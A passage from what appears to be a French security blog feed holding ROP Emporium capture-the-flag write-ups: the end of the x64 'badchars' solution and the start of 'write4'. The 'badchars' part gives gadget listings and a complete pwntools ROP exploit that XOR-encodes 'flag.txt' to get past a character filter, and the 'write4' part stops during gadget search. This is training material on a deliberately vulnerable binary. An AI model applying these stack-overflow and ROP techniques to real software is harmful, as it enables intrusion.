</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009e7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">237</span><span style="color:#f92672">&gt;</span>:   mov    QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x38</span>],rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009eb</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">241</span><span style="color:#f92672">&gt;</span>:   mov    rdx,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x38</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009ef</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">245</span><span style="color:#f92672">&gt;</span>:   mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009f3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">249</span><span style="color:#f92672">&gt;</span>:   cmp    rdx,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009f6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">252</span><span style="color:#f92672">&gt;</span>:   jb     <span style="color:#ae81ff">0x7ffff7c0099a</span> <span style="color:#f92672">&lt;</span>pwnme<span style="color:#f92672">+</span><span style="color:#ae81ff">160</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009f8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">254</span><span style="color:#f92672">&gt;</span>:   lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xed</span>]        <span style="color:#75715e"># 0x7ffff7c00aec</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009ff</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">261</span><span style="color:#f92672">&gt;</span>:   call   <span style="color:#ae81ff">0x7ffff7c00780</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00a04</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">266</span><span style="color:#f92672">&gt;</span>:   nop
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00a05</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">267</span><span style="color:#f92672">&gt;</span>:   leave  
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00a06</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">268</span><span style="color:#f92672">&gt;</span>:   ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>Notre padding va être de <code>0x20+0x8</code> bytes.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>readelf <span style="color:#f92672">-</span>S badchars
</span></span><span style="display:flex;"><span>There are <span style="color:#ae81ff">29</span> section headers, starting at offset <span style="color:#ae81ff">0x1980</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Section Headers:
</span></span><span style="display:flex;"><span>  [Nr] Name              Type             Address           Offset
</span></span><span style="display:flex;"><span>       Size              EntSize          Flags  Link  Info  Align
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;...&gt;</span>
</span></span><span style="display:flex;"><span>  [<span style="color:#ae81ff">23</span>] <span style="color:#f92672">.</span>data             PROGBITS         <span style="color:#ae81ff">0000000000601028</span>  <span style="color:#ae81ff">00001028</span>
</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000010</span>  <span style="color:#ae81ff">0000000000000000</span>  WA       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;...&gt;</span>
</span></span></code></pre></div><p><code>.data</code> est situé à l&rsquo;adresse <code>0x00601028</code> et la section a le flag <code>W</code>, donc on peut écrire dedans.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary badchars <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;: mov&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005e2</span> : mov byte ptr [rip <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x200a4f</span>], <span style="color:#ae81ff">1</span> ; pop rbp ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400635</span> : mov dword ptr [rbp], esp ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400610</span> : mov eax, <span style="color:#ae81ff">0</span> ; pop rbp ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400602</span> : mov ebp, esp ; pop rbp ; jmp <span style="color:#ae81ff">0x400590</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040057c</span> : mov edi, <span style="color:#ae81ff">0x601038</span> ; jmp rax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400634</span> : mov qword ptr [r13], r12 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400601</span> : mov rbp, rsp ; pop rbp ; jmp <span style="color:#ae81ff">0x400590</span>
</span></span></code></pre></div><p>On a un <code>mov qword ptr [r13], r12 ; ret</code> situé à <code>0x00400634</code> qui va nous servir à écrire dans <code>.data</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary badchars <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;: pop&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040069c</span> : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040069e</span> : pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a0</span> : pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a2</span> : pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400604</span> : pop rbp ; jmp <span style="color:#ae81ff">0x400590</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040057b</span> : pop rbp ; mov edi, <span style="color:#ae81ff">0x601038</span> ; jmp rax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040069b</span> : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040069f</span> : pop rbp ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400588</span> : pop rbp ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a3</span> : pop rdi ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a1</span> : pop rsi ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040069d</span> : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span></code></pre></div><p>Avec ça, on a un <code>pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</code> situé à <code>0x0040069b</code> qu&rsquo;on va utiliser avec le <code>mov</code>.</p>
<p>Tant qu&rsquo;à faire, on peut aussi garder de côté le <code>pop rdi ; ret</code> (<code>0x004006a3</code>) et le <code>pop r14 ; pop r15 ; ret</code> (<code>0x004006a0</code>).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary badchars <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;: xor&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400628</span> : xor byte ptr [r15], r14b ; ret
</span></span></code></pre></div><p>On met aussi ce <code>xor</code> de côté puisqu&rsquo;il va nous servir à un-XOR le string une fois en mémoire.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non<span style="color:#f92672">-</span>debugging symbols:
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004004d8</span>  _init
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400500</span>  pwnme<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400510</span>  print_file<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400520</span>  _start
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400550</span>  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400560</span>  deregister_tm_clones
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400590</span>  register_tm_clones
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005d0</span>  __do_global_dtors_aux
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400600</span>  frame_dummy
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400607</span>  main
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400617</span>  usefulFunction
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400628</span>  usefulGadgets
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400640</span>  __libc_csu_init
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006b0</span>  __libc_csu_fini
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006b4</span>  _fini
</span></span></code></pre></div><p><code>print_file()</code> est située à <code>0x00400510</code></p>
<p>L&rsquo;idée va donc être de:</p>
<ul>
<li>Mettre dans <code>.data</code> un string qui correspond à &ldquo;flag.txt&rdquo; XORé avec une clé de 2</li>
<li>Ensuite, on va le un-XOR avec notre gadget <code>xor</code> une fois qu&rsquo;il est déjà dans la mémoire</li>
<li>Enfin, on appelle <code>print_file()</code> avec notre string en paramètre</li>
</ul>
<p>Ceci va nous permettre de contourner le &ldquo;filtre&rdquo; puisque le string qu&rsquo;on va entrer dans l&rsquo;input ne contiendra aucun des badchars, c&rsquo;est seulement une fois en mémoire qu&rsquo;ils seront apparaîtront (magic)</p>
<h1 id="final-payload">Final Payload</h1>
<p>Voici donc notre payload:</p>
<blockquote>
<p>Note: j&rsquo;ai dû ajouter 8 à l&rsquo;adresse de <code>.data</code> puisque sinon il y avait un badchar dans l&rsquo;adresse elle même et elle se faisait filtrer</p></blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./badchars&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;flag.txt&#34;</span>
</span></span><span style="display:flex;"><span>flaglist <span style="color:#f92672">=</span> list(flag)
</span></span><span style="display:flex;"><span>xored_flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On xor notre string</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range (<span style="color:#ae81ff">0</span>, len(flaglist)):
</span></span><span style="display:flex;"><span>    flaglist[i] <span style="color:#f92672">=</span> chr(ord(flaglist[i])<span style="color:#f92672">^</span><span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>    xored_flag <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(flaglist[i])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x004004ee</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_r12_r13_r14_r15 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x0040069c</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Pour éviter des problèmes de type, on va prendre uniquement la valeur décimale de .data</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># +8</span>
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> <span style="color:#ae81ff">6295600</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mov_ptr_r13_r12 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400634</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_r14_r15 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x004006a0</span>)
</span></span><span style="display:flex;"><span>xor_byte_ptr_r15_r14 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400628</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x004006a3</span>)
</span></span><span style="display:flex;"><span>print_file <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400510</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp <span style="color:#f92672">+</span> ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On écrit notre &#34;flag.txt&#34; XORé dans r12, l&#39;adresse de .data dans r13 puis on remplit les deux autres registres de null bytes</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On met ensuite notre string dans l&#39;adresse vers laquelle pointe r13 (càd .data)</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_r12_r13_r14_r15
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> str<span style="color:#f92672">.</span>encode(xored_flag)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(data)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> mov_ptr_r13_r12
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On fait l&#39;opération suivante 8 fois car elle doit être faite pour chaque caractère du string</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># (&#34;flag.txt&#34; = 8 bytes)</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># On met 0x2 (càd la clé avec laquelle on a XOR notre string) dans r14</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Puis on met l&#39;adresse de data+i dans r15, car on va devoir un-xor caractère par caractère</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># On XOR ensuite le l&#39;adresse vers laquelle pointe r15 (.data+i) avec r14 (la clé)</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> pop_r14_r15
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(data<span style="color:#f92672">+</span>i)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> xor_byte_ptr_r15_r14
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Enfin, on met notre string un-XORé dans rdi, puis on appelle la fonction print_file()</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(data)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> print_file
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;payload.txt&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(payload)
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span></code></pre></div><p>On peut tester le payload pour s&rsquo;assurer qu&rsquo;il fonctionne:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/215351100-c463126a-5839-44ef-a4c8-a94397eca44c.png" alt="2023-01-29-202357_1179x660_scrot"></p>
<p>Et il fonctionne ! gg !</p>
]]></content>
        </item>
        
        <item>
            <title>🇫🇷 ROPEmporium - write4 (x64)</title>
            <link>/posts/2023/01/ropemporium-write4-x64/</link>
            <pubDate>Tue, 03 Jan 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/01/ropemporium-write4-x64/</guid>
            <description>&lt;h1 id=&#34;note&#34;&gt;Note&lt;/h1&gt;
&lt;p&gt;Quatrième exo de ROPEmporium, il introduit une nouvelle méchanique et nous pousse à utiliser un nouveau type de gadget, très intéressant&lt;/p&gt;
&lt;p&gt;Si j&amp;rsquo;ai fait des erreurs, n&amp;rsquo;hésitez pas à me contacter sur &lt;a href=&#34;https://discord.com/users/254689803822563348&#34;&gt;discord&lt;/a&gt; pour me le dire.&lt;/p&gt;
&lt;p&gt;Si vous ne comprenez pas quelque chose, je vous invite à &lt;a href=&#34;/series/ropemporium-x64-series/&#34;&gt;regarder la série dans l&amp;rsquo;ordre&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;description&#34;&gt;Description&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;On completing our usual checks for interesting strings and symbols in this binary we&amp;#39;re confronted with the stark truth that our favourite string &amp;#34;/bin/cat flag.txt&amp;#34; is not present this time. 
Although you&amp;#39;ll see later that there are other ways around this problem, such as resolving dynamically loaded libraries and using the strings present in those, we&amp;#39;ll stick to the challenge goal which is learning how to get data into the target process&amp;#39;s virtual address space via the magic of ROP.

Important!
A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like &amp;#34;flag.txt&amp;#34;) as the 1st argument. 
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;file-information&#34;&gt;File information&lt;/h2&gt;
&lt;p&gt;Avant de commencer à regarder dans l&amp;rsquo;executable, il faut savoir à quoi on s&amp;rsquo;attaque, on va utiliser &lt;code&gt;file&lt;/code&gt; pour avoir des informations sur le fichier, puis &lt;code&gt;checksec&lt;/code&gt; pour voir les éventuelles sécuritées avec lesquelles il a été compilé&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h1 id="note">Note</h1>
<p>Quatrième exo de ROPEmporium, il introduit une nouvelle méchanique et nous pousse à utiliser un nouveau type de gadget, très intéressant</p>
<p>Si j&rsquo;ai fait des erreurs, n&rsquo;hésitez pas à me contacter sur <a href="https://discord.com/users/254689803822563348">discord</a> pour me le dire.</p>
<p>Si vous ne comprenez pas quelque chose, je vous invite à <a href="/series/ropemporium-x64-series/">regarder la série dans l&rsquo;ordre</a>.</p>
<h2 id="description">Description</h2>
<pre tabindex="0"><code>On completing our usual checks for interesting strings and symbols in this binary we&#39;re confronted with the stark truth that our favourite string &#34;/bin/cat flag.txt&#34; is not present this time. 
Although you&#39;ll see later that there are other ways around this problem, such as resolving dynamically loaded libraries and using the strings present in those, we&#39;ll stick to the challenge goal which is learning how to get data into the target process&#39;s virtual address space via the magic of ROP.

Important!
A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like &#34;flag.txt&#34;) as the 1st argument. 
</code></pre><h2 id="file-information">File information</h2>
<p>Avant de commencer à regarder dans l&rsquo;executable, il faut savoir à quoi on s&rsquo;attaque, on va utiliser <code>file</code> pour avoir des informations sur le fichier, puis <code>checksec</code> pour voir les éventuelles sécuritées avec lesquelles il a été compilé</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">file</span> <span style="color:#f92672">write4</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">write4</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">dynamically</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">interpreter</span> <span style="color:#f92672">/</span><span style="color:#f92672">lib64</span><span style="color:#f92672">/</span><span style="color:#f92672">ld-linux-x86-64</span>.<span style="color:#a6e22e">so</span>.<span style="color:#a6e22e">2</span><span style="color:#f92672">,</span> <span style="color:#f92672">for</span> <span style="color:#f92672">GNU</span><span style="color:#f92672">/</span><span style="color:#f92672">Linux</span> <span style="color:#f92672">3</span>.<span style="color:#a6e22e">2</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">4cbaee0791e9daa7dcc909399291b57ffaf4ecbe</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
</span></span></code></pre></div><p>On va donc s&rsquo;attaquer à un executable en 64bit, linké dynamiquement et qui n&rsquo;est pas strippé</p>
<p>Maintenant le <code>checksec</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">write4</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ropemporium/write4_x64/write4&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>     <span style="color:#f92672">amd64-64-little</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>    <span style="color:#f92672">Partial</span> <span style="color:#f92672">RELRO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>    <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>       <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Comme pour le précédent, <strong>NX</strong> est activé donc pas de shellcode, mais ce n&rsquo;est pas un problème puisque la description de l&rsquo;exercice nous indique exactement quoi faire</p>
<h2 id="exploitation">Exploitation</h2>
<p>On va le lancer pour voir ce qu&rsquo;il fait concrètement:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/213875956-5f7e3f8e-3d1e-42a1-b4f6-53168ef66fb4.png" alt="2023-01-21-151701_1046x476_scrot"></p>
<p>On voit que si on entre un nombre élevé de bytes dans l&rsquo;input le programme plante (<code>segfault</code>), ce qui veut dire qu&rsquo;on a commencé à overwrite des registres.</p>
<p>Cette fois pas besoin de désassembler les fonctions puisqu&rsquo;on sait exactement ce qu&rsquo;il faut faire, on peut commencer à ressembler les élements nécessaires pour construire notre payload.</p>
<p>Commençons par regarder les sections de l&rsquo;executable pour en trouver une dans laquelle on va pouvoir écrire:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>readelf <span style="color:#f92672">-</span>S write4                                                                  
</span></span><span style="display:flex;"><span>There are <span style="color:#ae81ff">29</span> section headers, starting at offset <span style="color:#ae81ff">0x1980</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Section Headers:
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;...&gt;</span>
</span></span><span style="display:flex;"><span>  [<span style="color:#ae81ff">23</span>] <span style="color:#f92672">.</span>data             PROGBITS         <span style="color:#ae81ff">0000000000601028</span>  <span style="color:#ae81ff">00001028</span>
</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000010</span>  <span style="color:#ae81ff">0000000000000000</span>  WA       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;...&gt;</span>
</span></span></code></pre></div><p>On voit que <code>.data</code> a les flags <strong>W</strong> et <strong>A</strong> qui correspondent à <strong>WRITE</strong> et <strong>ALLOCATE</strong>  donc on pourra écrire dans cette sections, gardons son adresse de côté (<code>0x00601028</code>)</p>
<p>Maintenant qu&rsquo;on sait <strong>où</strong> on va écrire, il faut savoir <strong>comment</strong> on va le faire. Pour cela, on va avoir besoin de deux gadgets:</p>
<ul>
<li>Le premier gadget devra <code>pop</code> deux registres</li>
<li>Le second devra mettre la valeur de l&rsquo;un dans le pointeur de l&rsquo;autre</li>
</ul>
<p>Concrètement, l&rsquo;idée va être de mettre dans un premier registre l&rsquo;adresse de <code>.data</code> et dans un deuxième notre string <code>&quot;/bin/cat flag.txt&quot;</code> . Ensuite, l&rsquo;idée sera de mettre le string dans le pointeur du premier registre, soit dans la section <code>.data</code>. Si c&rsquo;est un peu flou pour l&rsquo;instant, vous devriez mieux comprendre avec le code.</p>
<p>Regardons les gadgets présents dans le binaire avec ROPgadget:</p>
<p>Tout d&rsquo;abord, les <code>pop</code> gadgets:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary write4 <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;: pop&#34;</span>
